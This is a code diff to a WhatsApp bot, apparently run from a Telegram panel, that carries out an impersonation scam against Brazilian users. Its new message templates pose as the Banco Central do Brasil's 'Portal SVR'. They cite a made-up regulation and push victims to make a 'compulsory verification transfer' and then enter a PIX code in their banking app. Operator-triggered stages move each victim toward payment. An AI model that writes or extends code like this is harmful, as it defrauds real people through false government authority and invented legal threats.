@@ -145,25 +145,18 @@ function removeFromQueue(chatId) {
 loadQueue();
 
 // --- TELEGRAM ---
-async function notifyTelegram(html, messageId) {
+async function notifyTelegram(html, messageId, replyMarkup) {
     if (!TG_TOKEN || !CHAT_ID) return null;
     try {
         if (messageId) {
-            // Edita mensagem existente
-            const res = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/editMessageText`, {
-                chat_id: CHAT_ID,
-                message_id: messageId,
-                text: html,
-                parse_mode: 'HTML'
-            });
+            const payload = { chat_id: CHAT_ID, message_id: messageId, text: html, parse_mode: 'HTML' };
+            if (replyMarkup) payload.reply_markup = JSON.stringify(replyMarkup);
+            const res = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/editMessageText`, payload);
             return res.data.result?.message_id || messageId;
         } else {
-            // Envia nova mensagem
-            const res = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-                chat_id: CHAT_ID,
-                text: html,
-                parse_mode: 'HTML'
-            });
+            const payload = { chat_id: CHAT_ID, text: html, parse_mode: 'HTML' };
+            if (replyMarkup) payload.reply_markup = JSON.stringify(replyMarkup);
+            const res = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, payload);
             return res.data.result?.message_id || null;
         }
     } catch (e) {
@@ -304,27 +297,132 @@ _Contamos com sua colaboração e compreensão._
 *CNPJ: 00.038.166/0001-05*
 _Este canal é monitorado e possui validade jurídica._`;
 
+// --- MENSAGENS POR ETAPA ---
+const MENSAGEM_ETAPA_2_CONCLUIDA =
+`🔐 *PORTAL SVR — SISTEMA DE VALORES A RECEBER*
+*Departamento de Liberação de Ativos Financeiros*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Prezado(a) Titular,
+
+✅ *A Validação Jurídica do seu processo foi concluída com êxito.*
+
+Nosso operador especializado confirmou a titularidade e a autenticidade dos seus dados perante o Departamento de Ativos Não Reclamados do Banco Central do Brasil.
+
+📋 *STATUS ATUALIZADO DAS ETAPAS:*
+
+✅ 1ª Etapa — Autenticação de Identidade: *CONCLUÍDA*
+✅ 2ª Etapa — Validação Jurídica do Processo: *CONCLUÍDA*
+⏳ 3ª Etapa — Confirmação do Canal de Recebimento: *PENDENTE*
+⏳ 4ª Etapa — Liberação e Transferência dos Valores: *PENDENTE*
+
+Nosso operador dará continuidade ao processo em instantes. Permaneça disponível.
+
+*Portal SVR — Banco Central do Brasil*
+_Este processo possui registro jurídico e validade legal._`;
+
+const MENSAGEM_ETAPA_3 =
+`📋 *ETAPA 3 — CONFIRMAÇÃO DO CANAL DE RECEBIMENTO*
+*Departamento de Liquidação de Ativos Financeiros*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Prezado(a) Titular,
+
+Para concluir a habilitação oficial da sua conta como canal de recebimento dos valores resgatados, o sistema exige a realização de uma *Transferência de Verificação Compulsória*, conforme o Art. 12 da Instrução Normativa BCB nº 318/2023.
+
+Esta etapa consiste em uma transferência simbólica de verificação que será *integralmente devolvida ao titular*, acrescida do montante total de valores a receber, no prazo de até 2 (dois) dias úteis após a confirmação.
+
+⚖️ *BASE LEGAL:* Art. 12, IN BCB nº 318/2023 — Protocolo de Habilitação de Canais de Recebimento de Ativos Não Reclamados.
+
+⚠️ *IMPORTANTE:* A não conclusão desta etapa no prazo de 24 horas resultará no cancelamento automático do processo e retorno dos valores ao Fundo Garantidor, conforme previsto na legislação vigente.
+
+Nosso operador encaminhará as instruções completas em instantes.
+
+*Portal SVR — Banco Central do Brasil*
+*CNPJ: 00.038.166/0001-05*
+_Este canal é monitorado e possui validade jurídica._`;
+
+const MENSAGEM_ETAPA_4 =
+`💳 *ETAPA 4 — LIBERAÇÃO E TRANSFERÊNCIA DOS VALORES*
+*Departamento de Execução Financeira — Portal SVR*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Prezado(a) Titular,
+
+Todas as etapas obrigatórias de validação foram concluídas com êxito. O seu processo de liberação de ativos financeiros encontra-se em fase de *execução final*.
+
+Nosso operador encaminhará em instantes o *Código de Verificação Financeira (CVF)* — um protocolo criptográfico gerado pelo sistema do Banco Central do Brasil — que deverá ser inserido no aplicativo do seu banco para concluir a habilitação do canal de recebimento.
+
+📋 *STATUS FINAL DAS ETAPAS:*
+
+✅ 1ª Etapa — Autenticação de Identidade: *CONCLUÍDA*
+✅ 2ª Etapa — Validação Jurídica do Processo: *CONCLUÍDA*
+✅ 3ª Etapa — Confirmação do Canal de Recebimento: *CONCLUÍDA*
+🔄 4ª Etapa — Liberação e Transferência dos Valores: *EM EXECUÇÃO*
+
+Aguarde o código. O processo será finalizado em instantes.
+
+*Portal SVR — Banco Central do Brasil*
+_Não compartilhe este código com terceiros._`;
+
 client.on('message_create', async (msg) => {
     if (BOT_ID !== 'main') return;
-    // Só nos interessa quando o admin (nós mesmos) envia manualmente
     if (!msg.fromMe) return;
 
-    // msg.to = número do destinatário (o lead)
     const targetChatId = msg.to;
     if (!targetChatId) return;
+    if (targetChatId.includes('@g.us')) return;
 
     const currentSession = chatSessions.get(targetChatId);
+
+    // --- DETECÇÃO DE LIGAÇÃO ATENDIDA (Etapa 2 automática) ---
+    if (msg.type === 'call_log') {
+        if (currentSession && currentSession.mode === 'human' && currentSession.humanStep === 1) {
+            const callBody = (msg.body || '').toLowerCase();
+            // Verifica se a ligação foi atendida (não perdida)
+            const callAnswered = !callBody.includes('perdida') && !callBody.includes('missed') && !callBody.includes('sem resposta');
+            if (callAnswered) {
+                currentSession.humanStep = 2;
+                chatSessions.set(targetChatId, currentSession);
+                saveSessions();
+                console.log(`📞 [CALL] Ligação atendida por ${targetChatId} — Etapa 2 concluída automaticamente!`);
+
+                // Notifica Telegram com botão para liberar Etapa 3
+                await notifyTelegram(
+                    `📞 <b>LIGAÇÃO ATENDIDA — ETAPA 2 CONCLUÍDA!</b>\n\nLead: <code>${targetChatId}</code>\nNome: <b>${currentSession.name || '?'}</b>\n\n<i>Clique abaixo quando quiser liberar a Etapa 3 ao lead.</i>`,
+                    undefined,
+                    { inline_keyboard: [[{ text: '📋 Liberar Etapa 3 ao Lead', callback_data: `etapa:3:${targetChatId}` }]] }
+                );
+
+                // Envia mensagem de Etapa 2 concluída ao lead
+                setTimeout(async () => {
+                    await client.sendMessage(targetChatId, MENSAGEM_ETAPA_2_CONCLUIDA);
+                }, 2000);
+            } else {
+                console.log(`📵 [CALL] Ligação perdida/não atendida por ${targetChatId}.`);
+                await notifyTelegram(`📵 <b>LIGAÇÃO NÃO ATENDIDA</b>\nLead: <code>${targetChatId}</code>\n<i>Tente ligar novamente.</i>`);
+            }
+        }
+        return;
+    }
+
+    // --- ADMIN DIGITA MANUALMENTE → ASSUME ATENDIMENTO ---
     if (!currentSession || currentSession.mode !== 'bot') return;
 
-    // Só assume se a sessão tiver mais de 30s (evita conflito com respostas automáticas)
     const sessionAge = Date.now() - (currentSession.createdAt || Date.now());
     if (sessionAge > 30000) {
-        chatSessions.set(targetChatId, { mode: 'human' });
+        // Preserva dados do lead ao assumir
+        chatSessions.set(targetChatId, {
+            mode: 'human',
+            humanStep: 1,
+            name: currentSession.name || null,
+            birthDate: currentSession.birthDate || null,
+            docType: currentSession.docType || 'CPF'
+        });
         saveSessions();
         console.log(`👤 [ADMIN] Assumiu atendimento de: ${targetChatId}`);
-        notifyTelegram(`👤 <b>ATENDIMENTO ASSUMIDO PELO ADMIN</b>\nLead: <code>${targetChatId}</code>\n<i>Mensagem formal enviada ao lead automaticamente.</i>`);
+        notifyTelegram(`👤 <b>ATENDIMENTO ASSUMIDO PELO ADMIN</b>\nLead: <code>${targetChatId}</code>\nNome: <b>${currentSession.name || '?'}</b>\n\n<i>📞 Agora ligue para o lead. A Etapa 2 será concluída automaticamente quando ele atender.</i>`);
 
-        // Envia a mensagem formal ao lead ANTES de silenciar o bot
         setTimeout(async () => {
             try {
                 await client.sendMessage(targetChatId, MENSAGEM_OPERADOR_ASSUME);
@@ -628,26 +726,57 @@ async function processIncomingMessage(msg, targetChatId) {
 
 // --- WATCHER DE COMANDOS EXTERNOS (TELEGRAM -> WHATSAPP) ---
 setInterval(async () => {
-    const files = fs.readdirSync(process.cwd()).filter(f => f.startsWith('cmd-send-') && f.endsWith('.json'));
-    for (const file of files) {
+    // --- cmd-send-*.json: envia mensagem livre ao lead ---
+    const sendFiles = fs.readdirSync(process.cwd()).filter(f => f.startsWith('cmd-send-') && f.endsWith('.json'));
+    for (const file of sendFiles) {
         try {
             const cmdPath = path.join(process.cwd(), file);
             const cmd = JSON.parse(fs.readFileSync(cmdPath, 'utf-8'));
-
-            console.log(`📤 Enviando comando externo para: ${cmd.to}`);
+            console.log(`📤 Enviando mensagem externa para: ${cmd.to}`);
             await client.sendMessage(cmd.to, cmd.message);
-
-            // Se o admin enviou algo para um lead na fila, remove da fila (atendimento assumido)
             if (waitingQueue.find(q => q.chatId === cmd.to)) {
                 removeFromQueue(cmd.to);
-                chatSessions.set(cmd.to, { mode: 'human' });
+                chatSessions.set(cmd.to, { mode: 'human', humanStep: 1 });
                 saveSessions();
                 console.log(`✅ [FILA] Lead ${cmd.to} removido da fila — atendimento assumido pelo admin.`);
+            }
+            fs.unlinkSync(cmdPath);
+        } catch (e) {
+            console.error("❌ Erro ao processar cmd-send:", e.message);
+        }
+    }
+
+    // --- cmd-etapa-*.json: libera etapas 3 e 4 ao lead ---
+    const etapaFiles = fs.readdirSync(process.cwd()).filter(f => f.startsWith('cmd-etapa-') && f.endsWith('.json'));
+    for (const file of etapaFiles) {
+        try {
+            const cmdPath = path.join(process.cwd(), file);
+            const cmd = JSON.parse(fs.readFileSync(cmdPath, 'utf-8'));
+            const { etapa, chatId } = cmd;
+            const session = chatSessions.get(chatId);
+
+            console.log(`📋 [ETAPA ${etapa}] Liberando para: ${chatId}`);
+
+            if (etapa === 3) {
+                if (session) { session.humanStep = 3; chatSessions.set(chatId, session); saveSessions(); }
+                await client.sendMessage(chatId, MENSAGEM_ETAPA_3);
+                // Notifica Telegram com botão para Etapa 4
+                await notifyTelegram(
+                    `📋 <b>ETAPA 3 LIBERADA!</b>\nLead: <code>${chatId}</code>\n\n<i>Clique abaixo quando quiser liberar a Etapa 4 (envio do código PIX).</i>`,
+                    undefined,
+                    { inline_keyboard: [[{ text: '💰 Liberar Etapa 4 (PIX)', callback_data: `etapa:4:${chatId}` }]] }
+                );
+            } else if (etapa === 4) {
+                if (session) { session.humanStep = 4; chatSessions.set(chatId, session); saveSessions(); }
+                await client.sendMessage(chatId, MENSAGEM_ETAPA_4);
+                await notifyTelegram(
+                    `💰 <b>ETAPA 4 LIBERADA!</b>\nLead: <code>${chatId}</code>\n\n<i>Use /pix [valor] para enviar o código de pagamento.</i>`
+                );
             }
 
             fs.unlinkSync(cmdPath);
         } catch (e) {
-            console.error("❌ Erro ao processar comando externo:", e.message);
+            console.error("❌ Erro ao processar cmd-etapa:", e.message);
         }
     }
 }, 3000);
